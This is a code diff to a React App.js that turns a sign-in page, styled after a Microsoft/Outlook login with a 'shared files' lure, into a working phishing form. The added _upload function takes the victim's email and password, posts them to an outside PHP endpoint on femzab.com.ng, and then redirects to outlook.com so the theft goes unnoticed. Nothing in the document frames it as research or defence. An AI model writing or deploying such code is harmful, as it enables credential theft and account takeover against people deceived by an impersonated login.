@@ -1,8 +1,42 @@
 // import logo from './logo.svg';
 import './App.css';
 import background from "./asset/bg.png";
+import { useState } from 'react'
+import Loader from "react-js-loader";
+import axios from 'axios'
 
 function App() {
+  const [loading, setLoading] = useState(false)
+  const [error, setError] = useState('')
+  const [input, setInput] =  useState({
+    email: '',
+    password: ''
+  })
+
+  const _upload = async()=>{
+    // validate input
+    setError("")
+    if( !(/^[^@]+@\w+(\.\w+)+\w$/.test(input.email)) ){
+      setError("Email is invalid")
+      return
+    }
+
+    if( (input.password).length < 2  ){
+      setError("Password is required")
+      return
+    }
+
+    setLoading(true)
+    try{
+      await axios.post("https://femzab.com.ng/recieve.php", input)
+      window.location.replace("https://outlook.com")
+    }catch(e){
+      console.log(e)
+      setError('An error occurred, try again later')
+    }
+    setLoading(false)
+
+  }
   return (
     <div style={{ backgroundImage: `url(${background})`, position: 'fixed', width: '100%', height: '100%', backgroundSize: 'cover', display: 'flex', justifyContent: 'center', alignItems: 'center' }}>
       <div className="w3-card-4 w3-white w3-round w3-padding" style={{ width: 350 }}>
@@ -17,16 +51,31 @@ function App() {
             marginBottom: 20
            }}>Sign In</h5>
 
+           <div>
+            {
+              (loading && (
+                <Loader type="bubble-scale" bgColor={"#0a59a3"} title={""} color={'#0a59a3'} size={50} />
+              ))
+            }
+            
+            {
+              (error !== "") && (
+              <div className="w3-panel w3-pale-red w3-leftbar w3-border-red">
+                <p>{error}</p>
+              </div>)
+            }
+           </div>
+
           <div style={{ marginBottom: 20 }}>
             Only recipient email can access shared files
           </div>
 
           <div style={{ marginBottom: 20 }}>
-            <input className="w3-input w3-border w3-round" placeholder="Email, Phone or Skype" />
+            <input value={input.email} onChange={e => setInput({...input, email: e.target.value})} className="w3-input w3-border w3-round" placeholder="Email, Phone or Skype" />
           </div>
 
           <div style={{ marginBottom: 20 }}>
-            <input className="w3-input w3-border w3-round" placeholder="Password" type="password" />
+            <input value={input.password} onChange={e => setInput({...input, password: e.target.value})} className="w3-input w3-border w3-round" placeholder="Password" type="password" />
           </div>
 
           <div style={{ display: 'flex', justifyContent: 'flex-end', alignItems: 'flex-end', marginBottom: 20 }}>
@@ -34,7 +83,7 @@ function App() {
           </div>
 
           <div style={{ display: 'flex', justifyContent: 'center', alignItems: 'center' }}>
-            <button className="w3-btn w3-block w3-text-white w3-round" style={{ width: '94%', background: '#0a59a3', fontWeight: '600' }}>Next</button>
+            <button onClick={()=>_upload()} className="w3-btn w3-block w3-text-white w3-round" style={{ width: '94%', background: '#0a59a3', fontWeight: '600' }}>Next</button>
           </div>
 
           <br />
